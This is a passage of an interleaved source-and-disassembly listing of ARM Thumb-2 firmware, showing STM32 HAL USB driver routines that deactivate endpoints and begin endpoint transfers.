 80065c8:	441a      	add	r2, r3
 80065ca:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 80065ce:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80065d2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80065d6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80065da:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80065de:	b29b      	uxth	r3, r3
 80065e0:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80065e2:	687a      	ldr	r2, [r7, #4]
 80065e4:	683b      	ldr	r3, [r7, #0]
 80065e6:	781b      	ldrb	r3, [r3, #0]
 80065e8:	009b      	lsls	r3, r3, #2
 80065ea:	4413      	add	r3, r2
 80065ec:	881b      	ldrh	r3, [r3, #0]
 80065ee:	b29b      	uxth	r3, r3
 80065f0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80065f4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80065f8:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 80065fc:	687a      	ldr	r2, [r7, #4]
 80065fe:	683b      	ldr	r3, [r7, #0]
 8006600:	781b      	ldrb	r3, [r3, #0]
 8006602:	009b      	lsls	r3, r3, #2
 8006604:	441a      	add	r2, r3
 8006606:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 800660a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800660e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006612:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006616:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800661a:	b29b      	uxth	r3, r3
 800661c:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 800661e:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 8006622:	4618      	mov	r0, r3
 8006624:	3774      	adds	r7, #116	; 0x74
 8006626:	46bd      	mov	sp, r7
 8006628:	f85d 7b04 	ldr.w	r7, [sp], #4
 800662c:	4770      	bx	lr
 800662e:	bf00      	nop

08006630 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006630:	b480      	push	{r7}
 8006632:	b08d      	sub	sp, #52	; 0x34
 8006634:	af00      	add	r7, sp, #0
 8006636:	6078      	str	r0, [r7, #4]
 8006638:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 800663a:	683b      	ldr	r3, [r7, #0]
 800663c:	7b1b      	ldrb	r3, [r3, #12]
 800663e:	2b00      	cmp	r3, #0
 8006640:	f040 808e 	bne.w	8006760 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 8006644:	683b      	ldr	r3, [r7, #0]
 8006646:	785b      	ldrb	r3, [r3, #1]
 8006648:	2b00      	cmp	r3, #0
 800664a:	d044      	beq.n	80066d6 <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800664c:	687a      	ldr	r2, [r7, #4]
 800664e:	683b      	ldr	r3, [r7, #0]
 8006650:	781b      	ldrb	r3, [r3, #0]
 8006652:	009b      	lsls	r3, r3, #2
 8006654:	4413      	add	r3, r2
 8006656:	881b      	ldrh	r3, [r3, #0]
 8006658:	81bb      	strh	r3, [r7, #12]
 800665a:	89bb      	ldrh	r3, [r7, #12]
 800665c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006660:	2b00      	cmp	r3, #0
 8006662:	d01b      	beq.n	800669c <USB_DeactivateEndpoint+0x6c>
 8006664:	687a      	ldr	r2, [r7, #4]
 8006666:	683b      	ldr	r3, [r7, #0]
 8006668:	781b      	ldrb	r3, [r3, #0]
 800666a:	009b      	lsls	r3, r3, #2
 800666c:	4413      	add	r3, r2
 800666e:	881b      	ldrh	r3, [r3, #0]
 8006670:	b29b      	uxth	r3, r3
 8006672:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006676:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800667a:	817b      	strh	r3, [r7, #10]
 800667c:	687a      	ldr	r2, [r7, #4]
 800667e:	683b      	ldr	r3, [r7, #0]
 8006680:	781b      	ldrb	r3, [r3, #0]
 8006682:	009b      	lsls	r3, r3, #2
 8006684:	441a      	add	r2, r3
 8006686:	897b      	ldrh	r3, [r7, #10]
 8006688:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800668c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006690:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006694:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006698:	b29b      	uxth	r3, r3
 800669a:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800669c:	687a      	ldr	r2, [r7, #4]
 800669e:	683b      	ldr	r3, [r7, #0]
 80066a0:	781b      	ldrb	r3, [r3, #0]
 80066a2:	009b      	lsls	r3, r3, #2
 80066a4:	4413      	add	r3, r2
 80066a6:	881b      	ldrh	r3, [r3, #0]
 80066a8:	b29b      	uxth	r3, r3
 80066aa:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80066ae:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80066b2:	813b      	strh	r3, [r7, #8]
 80066b4:	687a      	ldr	r2, [r7, #4]
 80066b6:	683b      	ldr	r3, [r7, #0]
 80066b8:	781b      	ldrb	r3, [r3, #0]
 80066ba:	009b      	lsls	r3, r3, #2
 80066bc:	441a      	add	r2, r3
 80066be:	893b      	ldrh	r3, [r7, #8]
 80066c0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80066c4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80066c8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80066cc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80066d0:	b29b      	uxth	r3, r3
 80066d2:	8013      	strh	r3, [r2, #0]
 80066d4:	e192      	b.n	80069fc <USB_DeactivateEndpoint+0x3cc>
    }

    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80066d6:	687a      	ldr	r2, [r7, #4]
 80066d8:	683b      	ldr	r3, [r7, #0]
 80066da:	781b      	ldrb	r3, [r3, #0]
 80066dc:	009b      	lsls	r3, r3, #2
 80066de:	4413      	add	r3, r2
 80066e0:	881b      	ldrh	r3, [r3, #0]
 80066e2:	827b      	strh	r3, [r7, #18]
 80066e4:	8a7b      	ldrh	r3, [r7, #18]
 80066e6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80066ea:	2b00      	cmp	r3, #0
 80066ec:	d01b      	beq.n	8006726 <USB_DeactivateEndpoint+0xf6>
 80066ee:	687a      	ldr	r2, [r7, #4]
 80066f0:	683b      	ldr	r3, [r7, #0]
 80066f2:	781b      	ldrb	r3, [r3, #0]
 80066f4:	009b      	lsls	r3, r3, #2
 80066f6:	4413      	add	r3, r2
 80066f8:	881b      	ldrh	r3, [r3, #0]
 80066fa:	b29b      	uxth	r3, r3
 80066fc:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006700:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006704:	823b      	strh	r3, [r7, #16]
 8006706:	687a      	ldr	r2, [r7, #4]
 8006708:	683b      	ldr	r3, [r7, #0]
 800670a:	781b      	ldrb	r3, [r3, #0]
 800670c:	009b      	lsls	r3, r3, #2
 800670e:	441a      	add	r2, r3
 8006710:	8a3b      	ldrh	r3, [r7, #16]
 8006712:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006716:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800671a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800671e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006722:	b29b      	uxth	r3, r3
 8006724:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006726:	687a      	ldr	r2, [r7, #4]
 8006728:	683b      	ldr	r3, [r7, #0]
 800672a:	781b      	ldrb	r3, [r3, #0]
 800672c:	009b      	lsls	r3, r3, #2
 800672e:	4413      	add	r3, r2
 8006730:	881b      	ldrh	r3, [r3, #0]
 8006732:	b29b      	uxth	r3, r3
 8006734:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006738:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800673c:	81fb      	strh	r3, [r7, #14]
 800673e:	687a      	ldr	r2, [r7, #4]
 8006740:	683b      	ldr	r3, [r7, #0]
 8006742:	781b      	ldrb	r3, [r3, #0]
 8006744:	009b      	lsls	r3, r3, #2
 8006746:	441a      	add	r2, r3
 8006748:	89fb      	ldrh	r3, [r7, #14]
 800674a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800674e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006752:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006756:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800675a:	b29b      	uxth	r3, r3
 800675c:	8013      	strh	r3, [r2, #0]
 800675e:	e14d      	b.n	80069fc <USB_DeactivateEndpoint+0x3cc>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->is_in == 0U)
 8006760:	683b      	ldr	r3, [r7, #0]
 8006762:	785b      	ldrb	r3, [r3, #1]
 8006764:	2b00      	cmp	r3, #0
 8006766:	f040 80a5 	bne.w	80068b4 <USB_DeactivateEndpoint+0x284>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800676a:	687a      	ldr	r2, [r7, #4]
 800676c:	683b      	ldr	r3, [r7, #0]
 800676e:	781b      	ldrb	r3, [r3, #0]
 8006770:	009b      	lsls	r3, r3, #2
 8006772:	4413      	add	r3, r2
 8006774:	881b      	ldrh	r3, [r3, #0]
 8006776:	843b      	strh	r3, [r7, #32]
 8006778:	8c3b      	ldrh	r3, [r7, #32]
 800677a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800677e:	2b00      	cmp	r3, #0
 8006780:	d01b      	beq.n	80067ba <USB_DeactivateEndpoint+0x18a>
 8006782:	687a      	ldr	r2, [r7, #4]
 8006784:	683b      	ldr	r3, [r7, #0]
 8006786:	781b      	ldrb	r3, [r3, #0]
 8006788:	009b      	lsls	r3, r3, #2
 800678a:	4413      	add	r3, r2
 800678c:	881b      	ldrh	r3, [r3, #0]
 800678e:	b29b      	uxth	r3, r3
 8006790:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006794:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006798:	83fb      	strh	r3, [r7, #30]
 800679a:	687a      	ldr	r2, [r7, #4]
 800679c:	683b      	ldr	r3, [r7, #0]
 800679e:	781b      	ldrb	r3, [r3, #0]
 80067a0:	009b      	lsls	r3, r3, #2
 80067a2:	441a      	add	r2, r3
 80067a4:	8bfb      	ldrh	r3, [r7, #30]
 80067a6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067aa:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067ae:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80067b2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80067b6:	b29b      	uxth	r3, r3
 80067b8:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80067ba:	687a      	ldr	r2, [r7, #4]
 80067bc:	683b      	ldr	r3, [r7, #0]
 80067be:	781b      	ldrb	r3, [r3, #0]
 80067c0:	009b      	lsls	r3, r3, #2
 80067c2:	4413      	add	r3, r2
 80067c4:	881b      	ldrh	r3, [r3, #0]
 80067c6:	83bb      	strh	r3, [r7, #28]
 80067c8:	8bbb      	ldrh	r3, [r7, #28]
 80067ca:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80067ce:	2b00      	cmp	r3, #0
 80067d0:	d01b      	beq.n	800680a <USB_DeactivateEndpoint+0x1da>
 80067d2:	687a      	ldr	r2, [r7, #4]
 80067d4:	683b      	ldr	r3, [r7, #0]
 80067d6:	781b      	ldrb	r3, [r3, #0]
 80067d8:	009b      	lsls	r3, r3, #2
 80067da:	4413      	add	r3, r2
 80067dc:	881b      	ldrh	r3, [r3, #0]
 80067de:	b29b      	uxth	r3, r3
 80067e0:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80067e4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80067e8:	837b      	strh	r3, [r7, #26]
 80067ea:	687a      	ldr	r2, [r7, #4]
 80067ec:	683b      	ldr	r3, [r7, #0]
 80067ee:	781b      	ldrb	r3, [r3, #0]
 80067f0:	009b      	lsls	r3, r3, #2
 80067f2:	441a      	add	r2, r3
 80067f4:	8b7b      	ldrh	r3, [r7, #26]
 80067f6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80067fa:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80067fe:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006802:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006806:	b29b      	uxth	r3, r3
 8006808:	8013      	strh	r3, [r2, #0]

      /* Reset value of the data toggle bits for the endpoint out*/
      PCD_TX_DTOG(USBx, ep->num);
 800680a:	687a      	ldr	r2, [r7, #4]
 800680c:	683b      	ldr	r3, [r7, #0]
 800680e:	781b      	ldrb	r3, [r3, #0]
 8006810:	009b      	lsls	r3, r3, #2
 8006812:	4413      	add	r3, r2
 8006814:	881b      	ldrh	r3, [r3, #0]
 8006816:	b29b      	uxth	r3, r3
 8006818:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800681c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006820:	833b      	strh	r3, [r7, #24]
 8006822:	687a      	ldr	r2, [r7, #4]
 8006824:	683b      	ldr	r3, [r7, #0]
 8006826:	781b      	ldrb	r3, [r3, #0]
 8006828:	009b      	lsls	r3, r3, #2
 800682a:	441a      	add	r2, r3
 800682c:	8b3b      	ldrh	r3, [r7, #24]
 800682e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006832:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006836:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800683a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800683e:	b29b      	uxth	r3, r3
 8006840:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006842:	687a      	ldr	r2, [r7, #4]
 8006844:	683b      	ldr	r3, [r7, #0]
 8006846:	781b      	ldrb	r3, [r3, #0]
 8006848:	009b      	lsls	r3, r3, #2
 800684a:	4413      	add	r3, r2
 800684c:	881b      	ldrh	r3, [r3, #0]
 800684e:	b29b      	uxth	r3, r3
 8006850:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006854:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006858:	82fb      	strh	r3, [r7, #22]
 800685a:	687a      	ldr	r2, [r7, #4]
 800685c:	683b      	ldr	r3, [r7, #0]
 800685e:	781b      	ldrb	r3, [r3, #0]
 8006860:	009b      	lsls	r3, r3, #2
 8006862:	441a      	add	r2, r3
 8006864:	8afb      	ldrh	r3, [r7, #22]
 8006866:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800686a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800686e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006872:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006876:	b29b      	uxth	r3, r3
 8006878:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800687a:	687a      	ldr	r2, [r7, #4]
 800687c:	683b      	ldr	r3, [r7, #0]
 800687e:	781b      	ldrb	r3, [r3, #0]
 8006880:	009b      	lsls	r3, r3, #2
 8006882:	4413      	add	r3, r2
 8006884:	881b      	ldrh	r3, [r3, #0]
 8006886:	b29b      	uxth	r3, r3
 8006888:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800688c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006890:	82bb      	strh	r3, [r7, #20]
 8006892:	687a      	ldr	r2, [r7, #4]
 8006894:	683b      	ldr	r3, [r7, #0]
 8006896:	781b      	ldrb	r3, [r3, #0]
 8006898:	009b      	lsls	r3, r3, #2
 800689a:	441a      	add	r2, r3
 800689c:	8abb      	ldrh	r3, [r7, #20]
 800689e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068a2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068a6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80068aa:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80068ae:	b29b      	uxth	r3, r3
 80068b0:	8013      	strh	r3, [r2, #0]
 80068b2:	e0a3      	b.n	80069fc <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80068b4:	687a      	ldr	r2, [r7, #4]
 80068b6:	683b      	ldr	r3, [r7, #0]
 80068b8:	781b      	ldrb	r3, [r3, #0]
 80068ba:	009b      	lsls	r3, r3, #2
 80068bc:	4413      	add	r3, r2
 80068be:	881b      	ldrh	r3, [r3, #0]
 80068c0:	85fb      	strh	r3, [r7, #46]	; 0x2e
 80068c2:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 80068c4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80068c8:	2b00      	cmp	r3, #0
 80068ca:	d01b      	beq.n	8006904 <USB_DeactivateEndpoint+0x2d4>
 80068cc:	687a      	ldr	r2, [r7, #4]
 80068ce:	683b      	ldr	r3, [r7, #0]
 80068d0:	781b      	ldrb	r3, [r3, #0]
 80068d2:	009b      	lsls	r3, r3, #2
 80068d4:	4413      	add	r3, r2
 80068d6:	881b      	ldrh	r3, [r3, #0]
 80068d8:	b29b      	uxth	r3, r3
 80068da:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80068de:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80068e2:	85bb      	strh	r3, [r7, #44]	; 0x2c
 80068e4:	687a      	ldr	r2, [r7, #4]
 80068e6:	683b      	ldr	r3, [r7, #0]
 80068e8:	781b      	ldrb	r3, [r3, #0]
 80068ea:	009b      	lsls	r3, r3, #2
 80068ec:	441a      	add	r2, r3
 80068ee:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 80068f0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80068f4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80068f8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80068fc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006900:	b29b      	uxth	r3, r3
 8006902:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006904:	687a      	ldr	r2, [r7, #4]
 8006906:	683b      	ldr	r3, [r7, #0]
 8006908:	781b      	ldrb	r3, [r3, #0]
 800690a:	009b      	lsls	r3, r3, #2
 800690c:	4413      	add	r3, r2
 800690e:	881b      	ldrh	r3, [r3, #0]
 8006910:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006912:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006914:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006918:	2b00      	cmp	r3, #0
 800691a:	d01b      	beq.n	8006954 <USB_DeactivateEndpoint+0x324>
 800691c:	687a      	ldr	r2, [r7, #4]
 800691e:	683b      	ldr	r3, [r7, #0]
 8006920:	781b      	ldrb	r3, [r3, #0]
 8006922:	009b      	lsls	r3, r3, #2
 8006924:	4413      	add	r3, r2
 8006926:	881b      	ldrh	r3, [r3, #0]
 8006928:	b29b      	uxth	r3, r3
 800692a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800692e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006932:	853b      	strh	r3, [r7, #40]	; 0x28
 8006934:	687a      	ldr	r2, [r7, #4]
 8006936:	683b      	ldr	r3, [r7, #0]
 8006938:	781b      	ldrb	r3, [r3, #0]
 800693a:	009b      	lsls	r3, r3, #2
 800693c:	441a      	add	r2, r3
 800693e:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8006940:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006944:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006948:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800694c:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006950:	b29b      	uxth	r3, r3
 8006952:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006954:	687a      	ldr	r2, [r7, #4]
 8006956:	683b      	ldr	r3, [r7, #0]
 8006958:	781b      	ldrb	r3, [r3, #0]
 800695a:	009b      	lsls	r3, r3, #2
 800695c:	4413      	add	r3, r2
 800695e:	881b      	ldrh	r3, [r3, #0]
 8006960:	b29b      	uxth	r3, r3
 8006962:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006966:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800696a:	84fb      	strh	r3, [r7, #38]	; 0x26
 800696c:	687a      	ldr	r2, [r7, #4]
 800696e:	683b      	ldr	r3, [r7, #0]
 8006970:	781b      	ldrb	r3, [r3, #0]
 8006972:	009b      	lsls	r3, r3, #2
 8006974:	441a      	add	r2, r3
 8006976:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 8006978:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800697c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006980:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006984:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006988:	b29b      	uxth	r3, r3
 800698a:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 800698c:	687a      	ldr	r2, [r7, #4]
 800698e:	683b      	ldr	r3, [r7, #0]
 8006990:	781b      	ldrb	r3, [r3, #0]
 8006992:	009b      	lsls	r3, r3, #2
 8006994:	4413      	add	r3, r2
 8006996:	881b      	ldrh	r3, [r3, #0]
 8006998:	b29b      	uxth	r3, r3
 800699a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800699e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80069a2:	84bb      	strh	r3, [r7, #36]	; 0x24
 80069a4:	687a      	ldr	r2, [r7, #4]
 80069a6:	683b      	ldr	r3, [r7, #0]
 80069a8:	781b      	ldrb	r3, [r3, #0]
 80069aa:	009b      	lsls	r3, r3, #2
 80069ac:	441a      	add	r2, r3
 80069ae:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 80069b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069b8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069bc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069c0:	b29b      	uxth	r3, r3
 80069c2:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 80069c4:	687a      	ldr	r2, [r7, #4]
 80069c6:	683b      	ldr	r3, [r7, #0]
 80069c8:	781b      	ldrb	r3, [r3, #0]
 80069ca:	009b      	lsls	r3, r3, #2
 80069cc:	4413      	add	r3, r2
 80069ce:	881b      	ldrh	r3, [r3, #0]
 80069d0:	b29b      	uxth	r3, r3
 80069d2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80069d6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80069da:	847b      	strh	r3, [r7, #34]	; 0x22
 80069dc:	687a      	ldr	r2, [r7, #4]
 80069de:	683b      	ldr	r3, [r7, #0]
 80069e0:	781b      	ldrb	r3, [r3, #0]
 80069e2:	009b      	lsls	r3, r3, #2
 80069e4:	441a      	add	r2, r3
 80069e6:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 80069e8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80069ec:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80069f0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80069f4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80069f8:	b29b      	uxth	r3, r3
 80069fa:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 80069fc:	2300      	movs	r3, #0
}
 80069fe:	4618      	mov	r0, r3
 8006a00:	3734      	adds	r7, #52	; 0x34
 8006a02:	46bd      	mov	sp, r7
 8006a04:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006a08:	4770      	bx	lr

08006a0a <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006a0a:	b580      	push	{r7, lr}
 8006a0c:	b0c2      	sub	sp, #264	; 0x108
 8006a0e:	af00      	add	r7, sp, #0
 8006a10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a14:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006a18:	6018      	str	r0, [r3, #0]
 8006a1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a1e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a22:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006a24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a28:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a2c:	681b      	ldr	r3, [r3, #0]
 8006a2e:	785b      	ldrb	r3, [r3, #1]
 8006a30:	2b01      	cmp	r3, #1
 8006a32:	f040 86b7 	bne.w	80077a4 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006a36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a3e:	681b      	ldr	r3, [r3, #0]
 8006a40:	699a      	ldr	r2, [r3, #24]
 8006a42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a4a:	681b      	ldr	r3, [r3, #0]
 8006a4c:	691b      	ldr	r3, [r3, #16]
 8006a4e:	429a      	cmp	r2, r3
 8006a50:	d908      	bls.n	8006a64 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006a52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a56:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a5a:	681b      	ldr	r3, [r3, #0]
 8006a5c:	691b      	ldr	r3, [r3, #16]
 8006a5e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006a62:	e007      	b.n	8006a74 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006a64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a68:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a6c:	681b      	ldr	r3, [r3, #0]
 8006a6e:	699b      	ldr	r3, [r3, #24]
 8006a70:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006a74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a7c:	681b      	ldr	r3, [r3, #0]
 8006a7e:	7b1b      	ldrb	r3, [r3, #12]
 8006a80:	2b00      	cmp	r3, #0
 8006a82:	d13a      	bne.n	8006afa <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006a84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a8c:	681b      	ldr	r3, [r3, #0]
 8006a8e:	6959      	ldr	r1, [r3, #20]
 8006a90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006a94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006a98:	681b      	ldr	r3, [r3, #0]
 8006a9a:	88da      	ldrh	r2, [r3, #6]
 8006a9c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006aa0:	b29b      	uxth	r3, r3
 8006aa2:	f507 7084 	add.w	r0, r7, #264	; 0x108
